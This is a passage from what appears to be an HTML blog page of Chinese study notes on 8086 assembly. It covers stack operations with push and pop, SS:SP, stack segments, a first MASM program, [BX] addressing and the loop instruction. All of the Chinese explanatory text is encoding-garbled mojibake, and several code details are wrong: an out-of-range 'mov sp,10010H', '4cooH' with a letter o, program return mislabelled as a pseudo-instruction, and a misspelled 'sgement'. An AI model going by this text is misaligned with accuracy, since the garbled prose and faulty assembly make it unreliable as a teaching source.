åªæœ‰ä¸€ä¸ª</li></ul><h2 id="3-6-æ ˆ"><a href="#3-6-æ ˆ" class="headerlink" title="3.6 æ ˆ"></a>3.6 æ ˆ</h2><p>å…ˆè¿›åå‡º</p><h2 id="3-7-CPUæä¾›çš„æ ˆæœºåˆ¶"><a href="#3-7-CPUæä¾›çš„æ ˆæœºåˆ¶" class="headerlink" title="3. 7 CPUæä¾›çš„æ ˆæœºåˆ¶"></a>3. 7 CPUæä¾›çš„æ ˆæœºåˆ¶</h2><ul><li><p>8086CPU å…¥æ ˆå’Œå‡ºæ ˆéƒ½æ˜¯ä»¥<strong>å­—</strong>ä¸ºå•ä½çš„</p></li><li><p>push ax æ˜¯å°†å¯„å­˜å™¨çš„æ•°æ®é€å…¥æ ˆä¸­ï¼Œpop ax è¡¨ç¤ºä»æ ˆé¡¶å–å‡ºæ•°æ®é€å…¥ ax</p></li><li><p>æ®µå¯„å­˜å™¨ SS å’Œå¯„å­˜å™¨ SPï¼Œ<strong>æ ˆé¡¶çš„æ®µåœ°å€å­˜æ”¾åœ¨ SS ä¸­ï¼Œåç§»åœ°å€å­˜æ”¾åœ¨SPä¸­</strong>ï¼ŒCPU ä» SS å’Œ SP ä¸­å¾—åˆ°æ ˆé¡¶çš„åœ°å€</p></li><li><p><strong>ä»»æ„æ—¶åˆ»ï¼ŒSS:SP æŒ‡å‘æ ˆé¡¶å…ƒç´ </strong></p></li></ul><h5 id="push-ax-æ‰§è¡Œæ­¥éª¤ï¼š"><a href="#push-ax-æ‰§è¡Œæ­¥éª¤ï¼š" class="headerlink" title="push ax æ‰§è¡Œæ­¥éª¤ï¼š"></a>push ax æ‰§è¡Œæ­¥éª¤ï¼š</h5><p>â€‹1ï¼‰SP&#x3D;SP-2,SS:SP æŒ‡å‘å½“å‰æ ˆé¡¶å‰é¢çš„å•å…ƒï¼Œä»¥æ­¤ä¸ºæ–°çš„æ ˆé¡¶</p><p>â€‹2ï¼‰å°† ax ä¸­çš„å†…å®¹é€å…¥SS:SP æŒ‡å‘çš„å†…å­˜å•å…ƒå¤„ï¼ŒSS:SP æ­¤æ—¶æŒ‡å‘æ–°æ ˆé¡¶</p><p><img src="https://img.dkdun.cn/v1/2025/12/7abce8d3ed075e5c.png"></p><p>å°† 10000H~1000FH å½“ä½œæ ˆï¼ŒSS&#x3D;1000Hï¼Œæ ˆç©ºé—´å¤§å°ä¸º16å­—èŠ‚ã€‚ä»»æ„æ—¶åˆ» SS:SP æŒ‡å‘æ ˆé¡¶ï¼Œå½“æ ˆä¸­åªæœ‰ä¸€ä¸ªå…ƒç´ æ—¶ï¼ŒSS&#x3D;1000Hï¼ŒSP&#x3D;000EHã€‚æ ˆä¸ºç©ºï¼Œå°±ç›¸å½“äºæ ˆä¸­å”¯ä¸€çš„å…ƒç´ å‡ºæ ˆï¼Œå‡ºæ ˆåï¼ŒSP&#x3D;SP+2ï¼ŒSP åŸæ¥ä¸º 000EHï¼Œå SP&#x3D;0010Hï¼Œæ‰€ä»¥æ ˆä¸ºç©ºæ—¶ï¼ŒSS&#x3D;1000H,SP&#x3D;10H</p><p><img src="https://img.dkdun.cn/v1/2025/12/2ec88a03c45bf2ad.png"></p><p>å½“æ ˆä¸ºç©ºæ—¶ï¼Œä¹Ÿå°±ä¸å­˜åœ¨æ ˆé¡¶å…ƒç´ ã€‚SS:SPå°±åªèƒ½æŒ‡å‘æœ€åº•éƒ¨å•å…ƒä¸‹é¢çš„å•å…ƒï¼Œè¯¥å•å…ƒçš„åç§»åœ°å€ä¸ºæ ˆæœ€åº•éƒ¨çš„å­—å•å…ƒçš„åç§»åœ°å€+2ï¼Œæ ˆæœ€åº•éƒ¨å­—å•å…ƒåœ°å€ä¸º1000:000E,æ‰€ä»¥æ ˆç©ºæ—¶ï¼ŒSP&#x3D;0010H</p><h5 id="pop-axæ­¥éª¤ï¼š"><a href="#pop-axæ­¥éª¤ï¼š" class="headerlink" title="pop axæ­¥éª¤ï¼š"></a>pop axæ­¥éª¤ï¼š</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">1) å°† SS:SP æŒ‡å‘çš„å†…å­˜å•å…ƒå¤„çš„æ•°æ®é€å…¥axä¸­<br>1) SP=SP+2ï¼ŒSS:SPæŒ‡å‘å½“å‰æ ˆä¸‹é¢å•å…ƒï¼Œä»¥æ­¤ä¸ºæ ˆé¡¶<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/dac4293593baecdf.png"></p><p>å‡ºæ ˆåï¼ŒSSï¼šSP æŒ‡å‘æ–°çš„æ ˆé¡¶ 1000EHï¼Œpop æ“ä½œå‰çš„æ ˆé¡¶å…ƒç´ ï¼Œ1000CH å¤„çš„ 2266H ä¾ç„¶å­˜åœ¨ã€‚ä½†å·²ç»ä¸åœ¨æ ˆä¸­ã€‚å†æ¬¡æ‰§è¡Œ push ç­‰å…¥æ ˆæŒ‡ä»¤åï¼ŒSSï¼šSP ç§»è‡³1000CHï¼Œå¹¶å†™å…¥æ–°çš„æ•°æ®ï¼Œå°†è¢«è¦†ç›–</p><h2 id="3-8-æ ˆé¡¶è¶…ç•Œçš„é—®é¢˜"><a href="#3-8-æ ˆé¡¶è¶…ç•Œçš„é—®é¢˜" class="headerlink" title="3.8 æ ˆé¡¶è¶…ç•Œçš„é—®é¢˜"></a>3.8 æ ˆé¡¶è¶…ç•Œçš„é—®é¢˜</h2><p>æ³¨æ„å…¥æ ˆå‡ºæ ˆæ—¶è¶…ç•Œé—®é¢˜</p><h2 id="3-9-pushã€popæŒ‡ä»¤"><a href="#3-9-pushã€popæŒ‡ä»¤" class="headerlink" title="3.9 pushã€popæŒ‡ä»¤"></a>3.9 pushã€popæŒ‡ä»¤</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push å¯„å­˜å™¨ //å°†ä¸€ä¸ªå¯„å­˜å™¨çš„æ•°æ®å…¥æ ˆ<br>pop  å¯„å­˜å™¨//ç”¨ä¸€ä¸ªå¯„å­˜å™¨æ¥æ”¶å‡ºæ ˆçš„æ•°æ®<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push æ®µå¯„å­˜å™¨//å°†ä¸€ä¸ªæ®µå¯„å­˜å™¨ä¸­çš„æ•°æ®å…¥æ ˆ<br>pop æ®µå¯„å­˜å™¨//ç”¨æ®µå¯„å­˜å™¨æ¥æ”¶æ•°æ®<br>push å†…å­˜å•å…ƒ//å°†ä¸€ä¸ªå†…å­˜å•å…ƒå¤„çš„å­—å…¥æ ˆ<br>pop å†…å­˜å•å…ƒ //ç”¨ä¸€ä¸ªå†…å­˜å•å…ƒæ¥æ”¶æ•°æ®<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">e.g.<br>mov ax,1000H<br>mov ds,ax<br>push [0]//å°†1000:0å¤„çš„å­—å‹å…¥æ ˆä¸­<br>pop [2]//å‡ºæ ˆçš„æ•°æ®æ”¾å…¥1000:2å¤„<br></code></pre></td></tr></table></figure><p>æŒ‡ä»¤æ‰§è¡Œæ—¶ï¼ŒCPU è¦çŸ¥é“å†…å­˜å•å…ƒçš„åœ°å€ï¼Œå¯ä»¥åœ¨ pushã€pop æŒ‡ä»¤ä¸­ç»™å‡ºå†…å­˜å•å…ƒçš„åç§»åœ°å€ï¼Œæ®µæŒ‡ä»¤åœ¨æ‰§è¡Œæ—¶ï¼ŒCPU ä» ds ä¸­è·å¾—</p><p>e.g</p><ol><li>å°† 10000H~1000FH è¿™æ®µç©ºé—´å½“ä½œæ ˆï¼Œåˆå§‹çŠ¶æ€æ ˆä¸ºç©ºï¼Œå°† AXï¼ŒBXï¼ŒDX ä¸­çš„æ•°æ®å…¥æ ˆ</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,1000H<br>mov ss,ax//è®¾ç½®æ ˆçš„æ®µåœ°å€ï¼ŒSS=1000H,ä¸èƒ½ç›´æ¥å‘æ®µå¯„å­˜å™¨SSä¸­é€å…¥æ•°æ®ï¼Œæ‰€ä»¥ç”¨axä¸­è½¬<br>mov sp,0010H//è®¾ç½®æ ˆé¡¶çš„åç§»åœ°å€ï¼Œæ ˆä¸ºç©ºï¼Œæ‰€ä»¥sp=0010H<br>push ax<br>push bx<br>push dx<br></code></pre></td></tr></table></figure><ol start="2"><li><p>å°† 10000H~1000FH è¿™æ®µç©ºé—´å½“ä½œæ ˆï¼Œåˆå§‹çŠ¶æ€æ˜¯ç©ºçš„ï¼ŒAX&#x3D;001AHï¼ŒBH&#x3D;001BHï¼Œå°† AXï¼ŒBX çš„æ•°æ®å…¥æ ˆï¼Œç„¶åå°† AXã€BX æ¸…é›¶ï¼Œä»æ ˆä¸­æ¢å¤ AXã€BX åŸæ¥çš„å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,1000H<br>mov ss,ax<br>mov sp,0010H//åˆå§‹åŒ–æ ˆ<br><br>mov ax,001AH<br>mov bx,001BH<br><br>push ax<br>push bx//ax,bxå…¥æ ˆ<br><br>sub ax,ax//axæ¸…é›¶ï¼Œä¹Ÿå¯ä»¥ç”¨mov ax,0<br>sub bx,bx<br><br>pop bx//æ¢å¤æ•°æ®ï¼Œå½“å‰æ ˆé¡¶ä¸ºbxä¸­çš„å†…å®¹001BHï¼Œaxçš„001AHåœ¨æ ˆé¡¶ä¸‹é¢ï¼Œæ‰€ä»¥å…ˆpop bx å†pop ax<br>pop ax<br></code></pre></td></tr></table></figure></li></ol><h2 id="3-10-æ ˆæ®µ"><a href="#3-10-æ ˆæ®µ" class="headerlink" title="3.10 æ ˆæ®µ"></a>3.10 æ ˆæ®µ</h2><p>ä¸€æ®µå†…å­˜å½“ä½œæ ˆï¼Œæ‰€ä»¥ä¸ºæ ˆæ®µ</p><ol><li><p>å°† 10000H~1000FH ä¸­çš„å…«ä¸ªå­—ï¼Œé€†åºå¤åˆ¶åˆ° 20000H-2000FH ä¸­</p></li><li><p><img src="https://img.dkdun.cn/v1/2025/12/94ec61152f16187c.png"></p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,1000H<br>mov ds,ax<br>mov ax,2000H<br>mov ss,ax<br>mov sp,10010H<br>push [0]<br>push [2]<br>push [4]<br>push [6]<br>push [8]<br>push [A]<br>push [C]<br>push [E]<br></code></pre></td></tr></table></figure><p>å°† 10000H~1000FH ä¸­çš„å…«ä¸ªå­—ï¼Œé€†åºå¤åˆ¶åˆ° 20000H-2000FH ä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,2000H<br>mov ds,ax<br>mov ax,1000H<br>mov ss,ax<br>mov sp,0<br>pop [E]<br>pop [C]<br>pop [A]<br>pop [8]<br>pop [6]<br>pop [4]<br>pop [2]<br>pop [0]<br></code></pre></td></tr></table></figure><h1 id="å››ã€ç¬¬ä¸€ä¸ªç¨‹åº"><a href="#å››ã€ç¬¬ä¸€ä¸ªç¨‹åº" class="headerlink" title="å››ã€ç¬¬ä¸€ä¸ªç¨‹åº"></a>å››ã€ç¬¬ä¸€ä¸ªç¨‹åº</h1><h2 id="4-2-æºç¨‹åº"><a href="#4-2-æºç¨‹åº" class="headerlink" title="4.2 æºç¨‹åº"></a>4.2 æºç¨‹åº</h2><h3 id="1-ä¼ªæŒ‡ä»¤"><a href="#1-ä¼ªæŒ‡ä»¤" class="headerlink" title="1. ä¼ªæŒ‡ä»¤"></a>1. ä¼ªæŒ‡ä»¤</h3><p><strong>æ±‡ç¼–è¯­è¨€ä¸­æœ‰æ±‡ç¼–æŒ‡ä»¤å’Œä¼ªæŒ‡ä»¤ã€‚</strong></p><ul><li>æ±‡ç¼–æŒ‡ä»¤ï¼šæœ‰å¯¹åº”çš„æœºå™¨ç æŒ‡ä»¤ï¼Œå¯ä»¥è¢«ç¼–è¯‘ä¸ºæœºå™¨æŒ‡ä»¤ï¼Œæœ€ç»ˆè¢« CPU æ‰€æ‰§è¡Œã€‚</li><li>ä¼ªæŒ‡ä»¤ï¼šæ²¡æœ‰å¯¹åº”çš„æœºå™¨æŒ‡ä»¤ï¼Œä¸è¢« CPU æ‰§è¡Œã€‚ç”±ç¼–è¯‘å™¨æ‰§è¡ŒæŒ‡ä»¤ï¼Œè¿›è¡Œç›¸å…³ç¼–è¯‘å·¥ä½œã€‚</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg//å°†ä»£ç æ®µcodesgå’ŒCPUçš„æ®µå¯„å­˜å™¨csè”ç³»<br>codesg segment//å®šä¹‰ä¸€ä¸ªæ®µï¼Œæ®µåä¸ºcodesg<br>mov ax,0123H<br>mov bx,0456H<br>add ax,bx<br>add ax,ax<br>mov ax,4c00H<br>int 21H<br>codesg ends//æ®µç»“æŸ<br>end//ç¨‹åºç»“æŸ<br></code></pre></td></tr></table></figure><p>a. segment å’Œ ends æ˜¯æˆå¯¹ä½¿ç”¨çš„ä¼ªæŒ‡ä»¤ï¼Œsegment å’Œ ends å®šä¹‰ä¸€ä¸ªæ®µï¼Œæ ¼å¼ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">æ®µå segment<br>:<br>æ®µå ends<br></code></pre></td></tr></table></figure><p>b. end è¡¨ç¤ºä¸€ä¸ªæ±‡ç¼–ç¨‹åºç»“æŸ</p><p>c. assume è¯´æ˜æŸæ®µå¯„å­˜å™¨å’Œç¨‹åºä¸­çš„æŸä¸€ä¸ªç”¨ segmentâ€¦ends å®šä¹‰çš„æ®µç›¸è”</p><h3 id="2-æºç¨‹åºä¸­çš„ç¨‹åº"><a href="#2-æºç¨‹åºä¸­çš„ç¨‹åº" class="headerlink" title="2. æºç¨‹åºä¸­çš„ç¨‹åº"></a>2. æºç¨‹åºä¸­çš„ç¨‹åº</h3><h3 id="3-æ ‡å·"><a href="#3-æ ‡å·" class="headerlink" title="3. æ ‡å·"></a>3. æ ‡å·</h3><p>å¦‚â€œcodesgâ€ï¼Œä¸€ä¸ªæ ‡å·ä»£è¡¨äº†ä¸€ä¸ªåœ°å€ï¼Œcodesg åœ¨ segment å‰é¢ï¼Œä½œä¸ºä¸€ä¸ªæ®µåç§°ï¼Œè¿™ä¸ªåç§°æœ€ç»ˆè¢«ç¼–è¯‘ã€è¿æ¥ç¨‹åºå¤„ç†ä¸ºä¸€ä¸ªæ®µçš„æ®µåœ°å€ã€‚</p><h3 id="4-ç¨‹åºçš„ç»“æ„"><a href="#4-ç¨‹åºçš„ç»“æ„" class="headerlink" title="4. ç¨‹åºçš„ç»“æ„"></a>4. ç¨‹åºçš„ç»“æ„</h3><p>ç¼–å†™è¿ç®—2^3ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:abc//å°†abcå’Œcsè”ç³»èµ·æ¥<br>abc segment//å®šä¹‰ä¸€ä¸ªç¨‹åºæ®µ<br>mov ax,2<br>add ax,ax<br>add ax,ax<br>abc ends<br>end//ç¨‹åºç»“æŸ<br></code></pre></td></tr></table></figure><h3 id="5-ç¨‹åºçš„è¿”å›"><a href="#5-ç¨‹åºçš„è¿”å›" class="headerlink" title="5. ç¨‹åºçš„è¿”å›"></a>5. ç¨‹åºçš„è¿”å›</h3><p>ä¸€ä¸ªç¨‹åºç»“æŸåï¼Œå°† CPU çš„æ§åˆ¶æƒäº¤æ¢ç»™å®ƒå¾—ä»¥è¿è¡Œçš„ç¨‹åºï¼Œè¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºç¨‹åºè¿”å›</p><table><thead><tr><th>ç›®çš„</th><th>ç›¸å…³æŒ‡ä»¤</th><th>æŒ‡ä»¤æ€§è´¨</th><th>æŒ‡ä»¤æ‰§è¡Œè€…</th></tr></thead><tbody><tr><td>é€šçŸ¥ç¼–è¯‘å™¨ä¸€ä¸ªæ®µçš„ç»“æŸ</td><td>æ®µå ends</td><td>ä¼ªæŒ‡ä»¤</td><td>ç¼–è¯‘æ—¶ç¼–è¯‘å™¨</td></tr><tr><td>é€šçŸ¥ç¼–è¯‘å™¨ç¨‹åºç»“æŸ</td><td>end</td><td>ä¼ªæŒ‡ä»¤</td><td>ç¼–è¯‘æ—¶ç”±ç¼–è¯‘å™¨</td></tr><tr><td>ç¨‹åºè¿”å›</td><td>mov ax,4cooH  int 21H</td><td>ä¼ªæŒ‡ä»¤</td><td>æ‰§è¡Œæ—¶ç”±CPU</td></tr></tbody></table><h2 id="4-3-ç¼–è¾‘æºç¨‹åº"><a href="#4-3-ç¼–è¾‘æºç¨‹åº" class="headerlink" title="4.3 ç¼–è¾‘æºç¨‹åº"></a>4.3 ç¼–è¾‘æºç¨‹åº</h2><p>DOS ä¸­æœ‰ä¸€ä¸ªç¨‹åº command.comï¼Œè¿™ä¸ªç¨‹åºåœ¨ DOS ä¸­ç§°ä¸ºå‘½ä»¤è§£é‡Šå™¨ï¼Œä¹Ÿå°±æ˜¯ DOS ç³»ç»Ÿçš„ shell</p><p>æ±‡ç¼–ç¨‹åºä»å†™å‡ºåˆ°æ‰§è¡Œè¿‡ç¨‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">ç¼–ç¨‹ -&gt; 1.asm-&gt; ç¼–è¯‘ -&gt; 1.obj -&gt; è¿æ¥ -&gt; 1.exe -&gt; åŠ è½½ -&gt; å†…å­˜ä¸­çš„ç¨‹åº -&gt; è¿è¡Œ<br>(Edit)   (masm)   (link)  (command) (CPU)<br></code></pre></td></tr></table></figure><h1 id="äº”ã€-BX-å’Œ-loop-æŒ‡ä»¤"><a href="#äº”ã€-BX-å’Œ-loop-æŒ‡ä»¤" class="headerlink" title="äº”ã€[BX] å’Œ loop æŒ‡ä»¤"></a>äº”ã€[BX] å’Œ loop æŒ‡ä»¤</h1><p>1.[bx] å’Œ [0] ç±»ä¼¼ï¼Œåç§»åœ°å€ä¸º 0</p><p>2.[bx] è¡¨ç¤ºä¸€ä¸ªå†…å­˜å•å…ƒï¼Œåç§»åœ°å€åœ¨ bx ä¸­</p><p>3.loop å¾ªç¯</p><p>4.â€ï¼ˆï¼‰â€œç¬¦å·ä¸‰ç§ç±»å‹ï¼š**a)**å¯„å­˜å™¨å</p><p>â€‹**b)**æ®µå¯„å­˜å™¨å </p><p>â€‹**c)**å†…å­˜å•å…ƒç‰©ç†åœ°å€ï¼ˆä¸€ä¸ª20ä½æ•°æ®ï¼‰</p><p>e.g</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">axå†…å®¹ä½0010Hï¼Œå¯ä»¥æè¿°ä¸ºï¼š(ax)=0010H<br>2000:1000å¤„çš„å†…å®¹ä¸º0010Hï¼Œæè¿°ä¸ºï¼š(21000H)=0010H<br>mov ax,[2]æè¿°ä¸º(ax)=((ds)*16+2)<br>mov [2],axæè¿°ä¸º((ds)*16+2)=ax<br>add ax,2æè¿°ä¸º(ax)=(ax)+2<br>add ax,bxæè¿°ä¸º(ax)=(ax)+(bx)<br>push ax æè¿°ä¸º (sp)=(sp)-2((ss)*16+(sp))=(ax)<br>pop axæè¿°ä¸º(ax)=((ss)*16+(sp))(sp)=(sp)+2<br></code></pre></td></tr></table></figure><p>5.â€(X)â€œä¸­è¡¨ç¤ºæ•°æ®æœ‰ä¸¤ç§ç±»å‹ï¼šå­—èŠ‚å’Œå­—</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">æ¯”å¦‚(al)ã€(bl)ã€(cl)ç­‰å¾—åˆ°çš„æ•°æ®ä¸ºå­—èŠ‚<br>(ds)ã€(ax)ã€(bx)ç­‰å¾—åˆ°çš„æ•°æ®ä¸ºå­—<br>(al)=(20000H)ï¼Œåˆ™(20000H)å¾—åˆ°çš„æ•°æ®ä¸ºå­—èŠ‚å‹<br>(ax)=(20000H)ï¼Œåˆ™(20000H)å¾—åˆ°çš„ä¸ºå­—å‹<br></code></pre></td></tr></table></figure><p>6.çº¦å®šç¬¦å· idata è¡¨ç¤ºå¸¸é‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,[idata]ä»£è¡¨ mov ax,[1]ã€mov ax,[2]ã€mov ax,[3]ç­‰<br>mov bx,idataä»£è¡¨mov bx,1ã€mov bx,2ã€mov bx,3ç­‰<br>mov ds,idataä»£è¡¨mov ds,1ã€mov ds,2ç­‰ï¼Œéƒ½æ˜¯éæ³•æŒ‡ä»¤<br></code></pre></td></tr></table></figure><h3 id="5-1-BX"><a href="#5-1-BX" class="headerlink" title="5.1 [BX]"></a>5.1 [BX]</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,[bx]<br>bxä¸­å­˜æ”¾æ•°æ®ä½œä¸ºä¸€ä¸ªåç§»åœ°å€EAï¼Œæ®µåœ°å€SAé»˜è®¤åœ¨dsä¸­ï¼Œå°†axä¸­çš„æ•°æ®é€å…¥å†…å­˜SA:EAå¤„ï¼Œå³:((ds)*16+(bx))=(ax)<br></code></pre></td></tr></table></figure><p>e.g å†™å‡ºç¨‹åºæ‰§è¡Œåï¼Œ21000H~21007H å•å…ƒä¸­çš„å†…å®¹</p><p><img src="https://img.dkdun.cn/v1/2025/12/fc40b0af9b9b9006.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,2000H<br>mov ds,ax<br>mov bx,1000H//ds=2000H,bx=1000H<br><br>mov ax,[bx]//å°†2000:1000å¤„çš„å­—å‹æ•°æ®é€å…¥axä¸­ã€‚ax=00beH<br><br>inc bx<br>inc bx//bx=1002H<br><br>mov [bx],ax//ds=2000H,bx=1002H,å°†axå†…å®¹é€å…¥2000:1002å¤„ã€‚2000:1002å†…å®¹ä¸ºBEï¼Œ2000:1003å†…å®¹ä¸º00<br>inc bx<br>inc bx//bx=1004H<br><br>mov [bx],ax//2000:1004å†…å®¹ä¸ºBEï¼Œ2000:1004å†…å®¹ä¸º00<br><br>inc bx//bx=1005H<br><br>mov [bx],al//ds=2000H,bx=1005H,å°†alä¸­çš„æ•°æ®é€å…¥2000:1005å¤„ã€‚2000:1005å•å…ƒçš„å†…å®¹ä¸ºBE<br><br>inc bx<br>mov [bx],al//bx=1006H,2000:1006å•å…ƒçš„å†…å®¹ä¸ºBE<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/13d635b29f0a5e87.png"></p><h3 id="5-2-LoopæŒ‡ä»¤"><a href="#5-2-LoopæŒ‡ä»¤" class="headerlink" title="5.2 LoopæŒ‡ä»¤"></a>5.2 LoopæŒ‡ä»¤</h3><ol><li><p>æ ¼å¼ï¼šloop  æ ‡å·</p></li><li><p>CPU æ‰§è¡ŒæŒ‡ä»¤æ—¶è¦è¿›è¡Œä¸¤æ­¥æ“ä½œï¼ša. (cx)&#x3D;(cx)-1  b. åˆ¤æ–­ cx ä¸­çš„å€¼ï¼Œä¸ä¸ºé›¶åˆ™è½¬è‡³æ ‡å·å¤„æ‰§è¡Œç¨‹åºï¼Œå¦‚æœä¸ºé›¶åˆ™å‘ä¸‹æ‰§è¡Œã€‚</p></li></ol><p>e,g è®¡ç®—2^2ï¼Œç»“æœå­˜åœ¨axä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>code sgement<br>mov ax,2<br>add ax,ax<br>mov ax,4c00h<br>int  21h<br>code ends<br>end<br></code></pre></td></tr></table></figure><p>e.g è®¡ç®—2^12,ç»“æœå­˜åœ¨ ax ä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>code segment<br>mov ax,2<br><br>mov cx,11<br>s: add ax,ax//ç”¨sæ ‡è¯†äº†ä¸€ä¸ªåœ°å€ï¼Œåœ°å€å¤„æœ‰ä¸€æ¡æŒ‡ä»¤ï¼šadd ax,ax<br>loop s//åˆ¤æ–­(cx)=(cx)-1ï¼Œä¸ä¸º0è½¬åˆ°sæ‰€æ ‡è¯†çš„åœ°å€å¤„æ‰§è¡Œï¼Œå¦‚æœä¸º0å°±æ‰§è¡Œä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œä¸‹ä¸€æ¡ä¸ºmov ax,4c00h<br>//æ‰§è¡Œloop sæ—¶ï¼Œé¦–å…ˆå°†(cx)-1ï¼Œä¸ä¸º0å°±è½¬åˆ°så¤„<br><br>mov ax,4c00h<br>int 21h<br>code ends<br>end<br></code></pre></td></tr></table></figure><p>cx å’Œ loop æŒ‡ä»¤é…åˆå®ç°å¾ªç¯3è¦ç‚¹ï¼š</p><p>â€‹1ï¼‰åœ¨ cx ä¸­å­˜æ”¾å¾ªç¯æ¬¡æ•°</p><p>â€‹2ï¼‰loop æŒ‡ä»¤ä¸­çš„æ ‡å·æ‰€æ ‡è¯†åœ°å€è¦åœ¨å‰é¢</p><p>â€‹3ï¼‰è¦å¾ªç¯æ‰§è¡Œçš„ç¨‹åºæ®µï¼Œè¦å†™åœ¨æ ‡å·å’Œ loop æŒ‡ä»¤çš„ä¸­é—´</p><p>æ¡†æ¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov cx,å¾ªç¯æ¬¡æ•°<br>s:<br>å¾ªç¯æ‰§è¡Œçš„ç¨‹åºæ®µ<br>loop s<br></code></pre></td></tr></table></figure><p>e.g ç”¨åŠ æ³•è®¡ç®—123*236,ç»“æœå­˜åœ¨axä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume 